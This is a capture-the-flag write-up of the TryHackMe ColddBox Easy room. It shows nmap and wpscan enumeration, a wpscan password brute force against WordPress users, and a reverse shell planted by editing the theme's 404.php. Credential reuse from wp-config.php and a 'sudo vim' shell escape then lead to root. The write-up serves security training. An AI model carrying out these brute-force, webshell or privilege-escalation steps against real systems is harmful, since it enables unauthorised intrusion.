
[TryHackMe Link](https://tryhackme.com/room/colddboxeasy){ .md-button }

!!! example "Description"

    <p id="desc" style="font-size:15px"></p>

In this CTF, I was able to successfully exploit a WordPress server using a combination of tools and techniques. In this blog post, I will share my experience and provide insights on how I was able to get the initial foothold, escalate my privileges, and finally became root.

## <b>Scanning</b>

* Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b>
  
* Open Ports: 

| <p style="font-size:14px; color: black">PORT</p>      | <p style="font-size:14px; color: black">SERVICE</p> |  <p style="font-size:14px; color: black">DESCRIPTION                          |
| :---------: | :---------: | :----------------------------------: |
| <p id="p1" style="font-size:14px; color: purple"></p>      | <p id="s1" style="font-size:14px; color: purple"></p>  |<p id="d1" style="font-size:14px; color: purple"></p>   |
| <p id="p2" style="font-size:14px;  color: purple"></p>     | <p id="s2" style="font-size:14px; color: purple"></p>  |<p id="d2" style="font-size:14px; color: purple"></p> |


* Nmap Report:
  ```sh linenums="1" hl_lines="6 10"
  # Nmap 7.93 scan initiated Mon Feb 20 13:34:05 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.237.179
    Nmap scan report for 10.10.237.179
    Host is up (0.15s latency).
    Not shown: 999 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-generator: WordPress 4.1.31
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: ColddBox | One more machine
    4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 4ebf98c09bc536808c96e8969565973b (RSA)
    |   256 8817f1a844f7f8062fd34f733298c7c5 (ECDSA)
    |_  256 f2fc6c750820b1b2512d94d694d7514f (ED25519)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.93%E=4%D=2/20%OT=80%CT=1%CU=42564%PV=Y%DS=5%DC=I%G=Y%TM=63F36FE
    OS:8%P=aarch64-unknown-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS
    OS:=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M
    OS:505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68
    OS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
    OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
    OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
    OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
    OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
    OS:=40%CD=S)

    Network Distance: 5 hops

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Mon Feb 20 08:04:40 2023 -- 1 IP address (1 host up) scanned in -19765.28 seconds
  ```

## <b>Enumeration</b>

The first step in this process was to enumerate the webserver (WordPress) with its vulnerable plugins, themes, and users using wpscan. 

!!! tip "User Enumeration" 
    <p id="desc" style="font-size:20px">```wpscan --url http://$IP -e  u```</p>

After running this command, it returned c0ldd, philip, and hugo as usernames.

```sh linenums="1" hl_lines="50 54 58"
[+] URL: http://10.10.237.179/ [10.10.237.179]
[+] Started: Mon Feb 20 13:13:31 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.237.179/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.237.179/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.237.179/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.237.179/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.237.179/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.10.237.179/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://10.10.237.179/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <========================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

```

I decided to brute force the usernames and passwords using wpscan's built-in feature.

!!! bug "Brute Force" 
    <p id="desc" style="font-size:20px">```wpscan --url $IP -U 'c0ldd,hugo,philip' -P /usr/share/seclists/Passwords/probable-v2-top12000.txt```</p>
    

```sh linenums="1" hl_lines="7 9 10"
[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 <=======================================> (137 / 137) 100.00% Time: 00:00:04

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 3 user/s
[SUCCESS] - c0ldd / {--REDACTED--}                                                                                        
^Cying philip / beanie Time: 00:09:52 <========                                 > (8839 / 40665) 21.73%  ETA: 00:35:35
[!] Valid Combinations Found:
 | Username: c0ldd, Password: {--REDACTED--}

[!] No WPScan API Token given, as a result vulnerability data has not been output.(8844 / 40665) 21.74%  ETA: 00:35:34
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Feb 20 13:32:05 2023
[+] Requests Done: 8984
[+] Cached Requests: 38
[+] Data Sent: 2.909 MB
[+] Data Received: 32.484 MB
[+] Memory used: 304.16 MB
[+] Elapsed time: 00:09:59
```
## <b>Initial Access</b>

Quickly, I directed to ```/wp-login.php``` to verify login with the harvested credentials -- {++c0ld:REDACTED++}

<img id="image1" />

After successfully logging in using the credentials for `c0ldd`, I edited the 404.php file in the appearance tab of the themes section to add a reverse shell. This allowed me to get my initial foothold into the web server. 

<img id="image2" />

I opened a listener on another tab and then opened the 404.php file in my browser. As a result, I gained access to the server with the `www-data` privilege.

<img id="image3" />
<img id="image4" />

## <b>Privilege Escalation</b>

### <b>Gaining User access</b>

As www-data, I didn't initially have access to any juicy information. However, I was able to run linpeas.sh, which helped me to find some credentials that were left in the wp-config.php file. 

<img id="image5" />

 I copied the username and password and attempted to access the `3306` port that was running on `127.0.0.1` but had no luck. Finally, I tried using the same credentials to log in to the `c0ldd` account. This was a success, and I was able to escalate my privilege from `www-data` to `c0ldd`.

### <b>Gaining Root access</b>

As `c0ldd`, I ran sudo -l as I already knew his password. The output showed that Vim could be run as sudo.

<img id="image6" />

With this knowledge, I was able to execute the command 

!!! success "Sudo Command"
    <p id="desc" style="font-size:20px">```sudo vim -c ':!/bin/sh'```</p>

from [GTFOBINS](https://gtfobins.github.io/gtfobins/vim/#sudo). This allowed me to edit a file that was owned by root, thereby giving me access to the root user. As a result, I was able to escalate my privilege once again and become root.

<script>
// JSON object
const data = {
    "desc": "An easy level machine with multiple ways to escalate privileges.",
    "ip":  "10.10.237.179",
    "ports": "80/tcp,http,Apache httpd 2.4.18;4512/tcp,ssh,OpenSSH 7.2p2 Ubuntu 4ubuntu2.10",
    "difficulty":"easy",
    "id": "1"
}


function updateHTML() {

    const keys = Object.keys(data);
    const values = Object.values(data);

    for(var z=0; z < keys.length; z++){

        if(keys[z] === "ports"){
            const ports = data.ports.split(';');
            for(var i = 0; i < ports.length; i++){
                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
            }
        }
        else{
            try{
            document.getElementById(keys[z]).innerHTML = values[z];
            }
            catch(error){
                console.log(values[z]);
            }
        }
    }

    // replace the values with your specific filenames and number of images and img tags
    const numImages = 5;
    const numImgTags = document.getElementsByTagName('img').length;

    for (let i = 1; i <= numImgTags; i++) {
    const imgTag = document.getElementById('image' + i);
        if (imgTag) {
            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
        }
    }


}

updateHTML();
</script>